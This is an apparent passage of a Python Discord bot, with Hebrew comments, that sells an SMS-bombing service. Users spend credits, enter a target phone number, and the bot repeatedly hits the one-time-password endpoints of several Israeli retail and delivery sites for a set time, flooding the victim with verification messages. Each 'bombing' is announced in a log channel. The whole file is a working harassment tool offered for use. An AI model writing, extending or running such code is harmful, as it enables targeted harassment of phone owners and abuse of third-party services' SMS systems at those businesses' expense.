LOG_CHANNEL_ID = 1499510962296721568 
DB_FILE = "credits_db.json"
ADMIN_ROLE_NAME = "Owner"

def load_data():
    if os.path.exists(DB_FILE):
        with open(DB_FILE, "r") as f:
            try:
                data = json.load(f)
                return {int(k): v for k, v in data.get("credits", {}).items()}, set(data.get("lifetime", []))
            except: pass
    return {}, set()

def save_data(credits, lifetime):
    with open(DB_FILE, "w") as f:
        json.dump({"credits": credits, "lifetime": list(lifetime)}, f)

user_credits, lifetime_users = load_data()

# שרת פנימי ל-Render
def run_on_render():
    PORT = int(os.environ.get("PORT", 8080))
    with socketserver.TCPServer(("", PORT), http.server.SimpleHTTPRequestHandler) as httpd:
        httpd.serve_forever()
threading.Thread(target=run_on_render, daemon=True).start()

bot = MyBot()
sem = asyncio.Semaphore(15)

async def call_api(client, url, method, payload):
    async with sem:
        try:
            if method == "POST":
                resp = await client.post(url, json=payload, timeout=4)
            else:
                resp = await client.get(url, params=payload, timeout=4)
            return resp.is_success
        except: return False

async def send_spam(user, phone, seconds):
    apis = [
        {"url": "https://www.shufersal.co.il/online/he/login/send-otp", "method": "POST", "data": {"phone": phone}},
        {"url": "https://www.super-pharm.co.il/api/otp/send", "method": "POST", "data": {"phoneNumber": phone}},
        {"url": "https://api.getpackage.com/v1/auth/login", "method": "POST", "data": {"phone": phone}},
        {"url": "https://pizzahut.co.il/api/auth/otp", "method": "POST", "data": {"phone": phone}},
        {"url": "https://www.wolt.com/api/v1/user/login", "method": "POST", "data": {"phone": phone}}
    ]
    
    success_count = 0
    fail_count = 0
    end_time = asyncio.get_event_loop().time() + seconds
    
    async with httpx.AsyncClient() as client:
        while asyncio.get_event_loop().time() < end_time:
            tasks = [call_api(client, api["url"], api["method"], api["data"]) for api in apis]
            results = await asyncio.gather(*tasks)
            success_count += results.count(True)
            fail_count += results.count(False)
            await asyncio.sleep(4)

    # שליחה לערוץ הציבורי בסיום
    channel = bot.get_channel(LOG_CHANNEL_ID)
    if channel:
        embed = discord.Embed(title="✅ הפצצה הסתיימה!", color=0x2ecc71)
        embed.add_field(name="👤 משתמש", value=user.mention, inline=True)
        embed.add_field(name="📱 יעד", value=f"||{phone}||", inline=True)
        embed.add_field(name="📊 סיכום", value=f"הצליחו: {success_count} | נכשלו: {fail_count}", inline=False)
        await channel.send(embed=embed)

class SpamModal(discord.ui.Modal, title='Spam-Me Panel'):
    phone = discord.ui.TextInput(label='Phone', placeholder='05XXXXXXXX', min_length=10, max_length=10)
    credits = discord.ui.TextInput(label='Credits', placeholder='1')

    async def on_submit(self, interaction: discord.Interaction):
        amt = int(self.credits.value)
        # בדיקת קרדיטים...
        if not (interaction.user.id in lifetime_users) and user_credits.get(interaction.user.id, 0) < amt:
            return await interaction.response.send_message("אין לך קרדיטים!", ephemeral=True)

        # הודעת פתיחה לערוץ
        channel = bot.get_channel(LOG_CHANNEL_ID)
        if channel:
            embed = discord.Embed(title="🚀 הפצצה חדשה!", color=0xe74c3c)
            embed.add_field(name="👤 הופעל ע\"י", value=interaction.user.mention, inline=True)
            embed.add_field(name="📱 יעד", value=f"||{self.phone.value}||", inline=True)
            await channel.send(embed=embed)

        await interaction.response.send_message("התחלנו! בדוק את ערוץ הלוגים.", ephemeral=True)
        asyncio.create_task(send_spam(interaction.user, self.phone.value, amt * 35))
